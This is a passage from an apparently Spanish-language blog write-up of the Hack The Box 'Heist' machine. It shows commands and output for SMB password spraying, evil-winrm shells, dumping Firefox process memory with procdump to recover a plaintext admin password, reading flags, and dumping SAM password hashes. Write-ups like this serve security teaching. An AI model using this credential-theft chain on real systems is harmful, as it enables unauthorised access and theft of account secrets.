+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\C</span>hase:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\C</span>hase:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:stealth1agent STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<ul>
+  <li>El usuario Chase usa una contraseña que tenemos además el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Chase'</span> <span class="nt">-p</span> <span class="s1">'Q4)sJu\Y8qz*A3?d'</span>
+SMB         10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span>
+HTTP        10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.116.26:5985/wsman
+WINRM       10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> para conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Chase'</span> <span class="nt">-p</span> <span class="s1">'Q4)sJu\Y8qz*A3?d'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>supportdesk<span class="se">\c</span>hase
+</code></pre></div></div>
+
+<h1 id="user-flag">user flag</h1>
+
+<ul>
+  <li>Podemos leer la <code class="language-plaintext highlighter-rouge">user flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+03b82a9b1533ba49d298214751e7bd51
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>No tenemos ningún privilegio interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a ver los procesos que esta corriendo la maquina.</p>
+  </li>
+  <li>
+    <p>Y vemos que esta corriendo el Firefox.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; ps
+
+Handles  NPM<span class="o">(</span>K<span class="o">)</span>    PM<span class="o">(</span>K<span class="o">)</span>      WS<span class="o">(</span>K<span class="o">)</span>     CPU<span class="o">(</span>s<span class="o">)</span>     Id  SI ProcessName
+<span class="nt">-------</span>  <span class="nt">------</span>    <span class="nt">-----</span>      <span class="nt">-----</span>     <span class="nt">------</span>     <span class="nt">--</span>  <span class="nt">--</span> <span class="nt">-----------</span>
+    467      18     2288       5428               364   0 csrss
+    287      13     1896       5020               476   1 csrss
+    357      15     3484      14528              4936   1 ctfmon
+    253      14     3956      13344              3868   0 dllhost
+    166       9     1868       9768       0.02   6492   1 dllhost
+    617      32    30384      57840               956   1 dwm
+   1494      58    23864      78872              5236   1 explorer
+   1087      69   129340     206756       4.94   6240   1 firefox
+    347      20    10204      38616       0.08   6348   1 firefox
+    401      35    34804      93476       0.73   6580   1 firefox
+    378      28    22008      58588       0.38   6788   1 firefox
+    355      25    16512      38936       0.08   7044   1 firefox
+     49       6     1496       3892               768   0 fontdrvhost
+     49       6     1776       4636               776   1 fontdrvhost
+      0       0       56          8                 0   0 Idle
+    973      23     5820      14900               624   0 lsass
+    223      13     2948      10200              3928   0 msdtc
+      0      12      324      15144                88   0 Registry
+    273      14     2988      14820              4792   1 RuntimeBroker
+    144       8     1644       7540              5716   1 RuntimeBroker
+    304      16     5596      16948              5840   1 RuntimeBroker
+    664      32    19612      61404              5640   1 SearchUI
+    541      11     4732       9448               608   0 services
+    691      29    14984      52012              5516   1 ShellExperienceHost
+    443      17     4928      24064              4976   1 sihost
+     53       3      516       1156               264   0 smss
+    471      22     5928      16200              2500   0 spoolsv
+    308      20     9708      14372               328   0 svchost
+    199      12     1964       9520               368   0 svchost
+    223      11     2844      10948               592   0 svchost
+    149       9     1700      11584               704   0 svchost
+     85       5      888       3792               724   0 svchost
+    861      20     7020      22312               748   0 svchost
+    310      16    13188      15460               792   0 svchost
+    864      16     5180      11684               856   0 svchost
+    255      10     1992       7676               904   0 svchost
+    127       7     1544       6220               964   0 svchost
+    379      13    10864      14812               976   0 svchost
+    337      16     4732      13572              1004   0 svchost
+    140       7     1304       5688              1132   0 svchost
+    127      17     3640       7492              1164   0 svchost
+    184       9     1776       7548              1232   0 svchost
+    230      12     2668      11276              1240   0 svchost
+    154       7     1208       5616              1252   0 svchost
+    429       9     2752       8824              1260   0 svchost
+    216       9     2128       7588              1324   0 svchost
+    170      10     1756       7940              1364   0 svchost
+    249      15     3236       8564              1404   0 svchost
+    304      12     2084       9000              1412   0 svchost
+    366      17     5104      14212              1428   0 svchost
+    347      14     4588      11828              1532   0 svchost
+    191      12     2076      11936              1548   0 svchost
+    163      10     2504       7424              1680   0 svchost
+    167       9     2160       7552              1752   0 svchost
+    323      10     2604       8420              1780   0 svchost
+    408      32     9056      17164              1804   0 svchost
+    194      11     1972       8136              1884   0 svchost
+    209      11     2780      11948              2032   0 svchost
+    238      11     2504       9720              2040   0 svchost
+    338      18    14776      31468              2168   0 svchost
+    465      17     3376      11856              2192   0 svchost
+    166      12     3904      10788              2588   0 svchost
+    179      22     2496       9844              2596   0 svchost
+    460      19    11424      26096              2604   0 svchost
+    261      13     2568       7880              2624   0 svchost
+    396      16    11124      20352              2648   0 svchost
+    133       9     1616       6548              2684   0 svchost
+    136       8     1508       6144              2720   0 svchost
+    205      11     2260       8324              2728   0 svchost
+    126       7     1224       5340              2740   0 svchost
+    238      15     4792      11824              2836   0 svchost
+    209      12     1872       7448              2844   0 svchost
+    169      10     2132      13248              2852   0 svchost
+    263      19     3588      12100              2864   0 svchost
+    441      62    14756      23396              2900   0 svchost
+    193      15     6000      10032              2956   0 svchost
+    383      23     3308      12232              3184   0 svchost
+    163       9     3016       7600              3948   0 svchost
+    255      14     3188      13832              4468   0 svchost
+    171       9     1476       7224              4492   0 svchost
+    167       9     4212      11848              4596   0 svchost
+    189      12     2696      13352              4860   0 svchost
+    230      12     3036      13592              4992   1 svchost
+    369      18     5652      27096              5016   1 svchost
+    254      13     3296      12508              5448   0 svchost
+    122       7     1232       5600              6188   0 svchost
+    115       7     1236       5356              7032   0 svchost
+   1892       0      192         88                 4   0 System
+    210      20     3900      12436              5052   1 taskhostw
+    167      11     2900      10840              2764   0 VGAuthService
+    136       9     1808       7408              2532   1 vm3dservice
+    142       8     1688       6888              2772   0 vm3dservice
+    383      22     9320      21796              2796   0 vmtoolsd
+    236      18     5048      15216              4828   1 vmtoolsd
+    242      21     5912      14768              6708   0 w3wp
+    171      11     1448       6852               468   0 wininit
+    282      13     2812      12796               532   1 winlogon
+    349      16     8968      18376              4024   0 WmiPrvSE
+    824      27    53908      69688       0.63   6012   0 wsmprovhost
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Podemos usar una herramienta <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">https://learn.microsoft.com/en-us/sysinternals/downloads/procdump</a> para realizar un volcado de un PID que le demos en este caso el de Firefox que analizaremos y ver las <code class="language-plaintext highlighter-rouge">strings</code> .</p>
+  </li>
+  <li>
+    <p>Tenemos los <code class="language-plaintext highlighter-rouge">.exe</code> pero solo vamos a subir 1 ala maquina <strong>procdump64.exe</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l Procdump.zip
+
+7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 731622 bytes <span class="o">(</span>715 KiB<span class="o">)</span>
+
+Listing archive: Procdump.zip
+
+<span class="nt">--</span>
+Path <span class="o">=</span> Procdump.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 731622
+
+   Date      Time    Attr         Size   Compressed  Name
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2022-11-03 15:55:14 .....       791960       364222  procdump.exe
+2022-11-03 15:55:14 .....       424856       196343  procdump64.exe
+2022-11-03 15:55:14 .....       407952       167513  procdump64a.exe
+2022-11-03 15:55:00 .....         7490         3120  Eula.txt
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2022-11-03 15:55:14            1632258       731198  4 files
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya los descomprimimos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip Procdump.zip
+Archive:  Procdump.zip
+  inflating: procdump.exe
+  inflating: procdump64.exe
+  inflating: procdump64a.exe
+  inflating: Eula.txt
+</code></pre></div></div>
+
+<ul>
+  <li>Y lo subimos ala maquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; upload procdump64.exe
+
+Info: Uploading /home/miguel/Hackthebox/Heist/content/procdump64.exe to C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\p</span>rocdump64.exe
+
+Data: 566472 bytes of 566472 bytes copied
+
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        4/14/2024   3:07 AM         424856 procdump64.exe
+<span class="nt">-a----</span>        4/22/2019   9:08 AM            121 todo.txt
+<span class="nt">-ar---</span>        4/14/2024   1:56 AM             34 user.txt
+</code></pre></div></div>
+
+<ul>
+  <li>Necesitamos saber el PID para que funcione.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; ps | findstr firefox
+   1083      69   135944     213292       5.03   6240   1 firefox
+    347      20    10204      38616       0.08   6348   1 firefox
+    401      34    32136      92488       0.78   6580   1 firefox
+    378      28    22316      58980       0.38   6788   1 firefox
+    355      25    16512      38936       0.08   7044   1 firefox
+</code></pre></div></div>
+
+<ul>
+  <li>Para hacerlo hacemos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; .<span class="se">\p</span>rocdump64.exe <span class="nt">-accepteula</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora le pasamos los parámetros y el PID.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; .<span class="se">\p</span>rocdump64.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> 6240
+
+ProcDump v11.0 - Sysinternals process dump utility
+Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2022 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+<span class="o">[</span>03:54:16] Dump 1 initiated: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\f</span>irefox.exe_240414_035416.dmp
+<span class="o">[</span>03:54:16] Dump 1 writing: Estimated dump file size is 493 MB.
+<span class="o">[</span>03:54:18] Dump 1 <span class="nb">complete</span>: 493 MB written <span class="k">in </span>2.5 seconds
+<span class="o">[</span>03:54:19] Dump count reached.
+</code></pre></div></div>
+
+<ul>
+  <li>Como el archivo pesa mucho lo que podemos hacer es que mientras se descarga podemos aplicar los <code class="language-plaintext highlighter-rouge">strings</code> y filtrar por <code class="language-plaintext highlighter-rouge">password</code> para ver si encontramos algo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; download C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\</span>
+Info: Downloading C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\f</span>irefox.exe_240414_035416.dmp to firefox.exe_240414_035416.dmp
+</code></pre></div></div>
+
+<ul>
+  <li>Y vemos esto esas credenciales funcionan para logearnos en la pagina web como el Administrator.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content strings firefox.exe_240414_035416.dmp | <span class="nb">grep </span>password
+passwordsCountHistogram
+passwordmgr-crypto-login
+passwordField
+passwordElement
+goog-passwordwhite-protox0E!
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\M</span><span class="s2">ozilla Firefox</span><span class="se">\f</span><span class="s2">irefox.exe"</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb&amp;login_password<span class="o">=</span>4dD!5<span class="o">}</span>x/re8]FBuZ&amp;login<span class="o">=</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/heist/9.png" />
+</p>
+
+<ul>
+  <li>Vemos también que el usuario esta dentro del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span>
+SMB         10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span>
+HTTP        10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.116.26:5985/wsman
+WINRM       10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\A</span>dministrator:4dD!5<span class="o">}</span>x/re8]FBuZ <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as administrator</h2>
+
+<ul>
+  <li>Ahora ya podemos ver la ultima flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+5c7ac5f3da79f3018d63e5639785415f
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="dumping-sam-hashes">Dumping SAM hashes</h2>
+
+<ul>
+  <li>Aquí tenemos los hashes de algunos usuarios para hacer <code class="language-plaintext highlighter-rouge">pass the hash</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span> <span class="nt">--sam</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\A</span>dministrator:4dD!5<span class="o">}</span>x/re8]FBuZ <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Dumping SAM hashes
+SMB         10.129.116.26   445    SUPPORTDESK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:10f08e9e3787aec843594cfd01f1a6a5:::
+SMB         10.129.116.26   445    SUPPORTDESK      Guest:501:aad3b435b51404eeaad3b435b51404ee:d5dd356a1d8a41ceafcd92f3e1795a71:::
+SMB         10.129.116.26   445    SUPPORTDESK      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.116.26   445    SUPPORTDESK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:83f0f384401e2cb89df6f920af3254c7:::
+SMB         10.129.116.26   445    SUPPORTDESK      Hazard:1008:aad3b435b51404eeaad3b435b51404ee:551f5fc818a8c5b65d19be1c977f5326:::
+SMB         10.129.116.26   445    SUPPORTDESK      support:1009:aad3b435b51404eeaad3b435b51404ee:04456c45a7adb052b6a315cb64992516:::
+SMB         10.129.116.26   445    SUPPORTDESK      Chase:1012:aad3b435b51404eeaad3b435b51404ee:bb2e1bf236b6219cb45811d5f2d55068:::
+SMB         10.129.116.26   445    SUPPORTDESK      Jason:1013:aad3b435b51404eeaad3b435b51404ee:10608c8436315acb9c703aa7b2e04750:::
+SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Added 8 SAM hashes to the database
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/04/13/heist.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolucion de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
